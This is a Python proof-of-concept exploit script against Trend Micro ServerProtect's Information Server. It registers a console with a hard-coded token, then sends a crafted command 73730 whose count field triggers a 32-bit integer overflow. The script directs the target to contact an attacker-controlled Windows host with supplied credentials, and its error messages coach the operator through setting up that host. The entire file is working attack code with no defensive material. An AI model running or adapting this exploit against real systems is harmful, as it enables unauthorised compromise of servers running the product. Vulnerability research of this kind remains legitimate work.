import sys, socket, argparse, hexdump, os
from struct import *

def dump(title, data):
  if debug and data:
    print('[-- %s --]' % (title))
    hexdump.hexdump(data)

def recvall(sock, n):
  data = bytearray(b'')
  while len(data) < n:
      packet = sock.recv(n - len(data))
      if not packet:
          return None
      data += packet
  return data

def recv_msg(sock):
  data = bytearray(b'')

  # Read header
  data = recvall(sock, 0x1C)
  
  # Get msg size 
  size = unpack_from('<I', data, 0x10)[0]

  if size < 0x1C or size > 0x800000:
    raise ValueError('Invalid msg size {}'.format(size))

  # Get data 
  data += recvall(sock, size - 0x1C)

  if len(data) != size:
    raise ValueError('Failed to read msg of {} bytes'.format(size))

  return bytes(data)

def read_msg(sock, key=None):
  r = dict()
  msg = recv_msg(sock)

  r['magic']  = unpack_from('<I', msg, 0)[0]
  r['cmd']    = unpack_from('<I', msg, 4)[0]
  r['err']    = unpack_from('<I', msg, 8)[0]

  dump('command {} response'.format(r['cmd']), msg)

  if len(msg) > 0x1C:
    data = msg[0x1C:]
  else:
    data = b'' 

  r['data'] = data
  return r

def mk_msg(cmd, data, cport, scount=0):
  msg = pack('<IIIIIII', 
    magic,
    cmd,
    0,
    scount,
    0x1C + len(data),
    cport,
    0) + data

  return msg

def send_msg(sock, cmd, data, cport, scount=0):
  msg = mk_msg(cmd, data, cport, scount) 
  dump('command {}'.format(cmd), msg)
  sock.sendall(msg) 


#
# MAIN
#
descr = 'Trend Micro ServerProtect Information Server Command 73730 int32 Overflow'

parser = argparse.ArgumentParser(description=descr, formatter_class=argparse.RawTextHelpFormatter)
required = parser.add_argument_group('required arguments')
required.add_argument('-t', '--target',required=True, help='Target host')
required.add_argument('-A', '--ahost',required=True, help='Attacker-controlled Windows host')
required.add_argument('-U', '--user', required=True, help='User account on the attacker-controlled Windows host')
required.add_argument('-P', '--password', required=True, help='User password')
parser.add_argument('-p', '--port', type=int, default=5005, help='ServerProtect Information Server port, default: %(default)s')
parser.add_argument('-d', '--debug', action='store_true', help='Dump command requests and responses')

args = parser.parse_args()
target = args.target
port = args.port
ahost = args.ahost
user = args.user
password  = args.password
debug = args.debug

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(10)
s.connect((target, port))

magic = 0x87654321
cmd = 2
cport = 1000
data = pack('68s', os.path.basename(sys.argv[0]).encode()) 
data += pack('<II', cport, 1) 
data += '!CRYPT!1087C8A854BBE88D3E554736F39'.encode('utf_16_le')
data += b'\x00' * (0x150 - len(data))
data += pack('<HHHH', 0, 0, 0, 12)
data += b'\x00' * 8
send_msg(s, cmd, data, cport)

r = read_msg(s)
if r['magic'] != magic or r['cmd'] != cmd or r['err'] != 0:
  sys.exit('Failed to register a console.')

print('Registered a client console OK')
cmd = 73730 
print('Sending a specially crafted command {} message'.format(cmd))

data  = pack('56s', ahost.encode()) 
data += pack('256s',user.encode('utf_16_le'))
data += pack('256s',password.encode('utf_16_le'))
data += pack('<I', int(0x100000000 / 56 + 1)) 
send_msg(s, cmd, data, cport)
r = read_msg(s)
s.close()

if r['err'] == 0x52E:
  sys.exit('Command 73730 returned ERROR_LOGON_FAILURE. Please use the correct credentials to access the attacker-controlled Windows host.')

if r['err'] == 2:
  sys.exit('Command 73730 returned ERROR_FILE_NOT_FOUND. Please create HKLM:\SOFTWARE\WOW6432Node\Trend\ServerProtect\CurrentVersion\InformationServer\ and subkeys on the attacker-controlled Windows host.')

if r['err'] == 0x35:
  sys.exit('Command 73730 returned ERROR_BAD_NETPATH. Please ensure the attacker-controlled Windows host is accessible.')
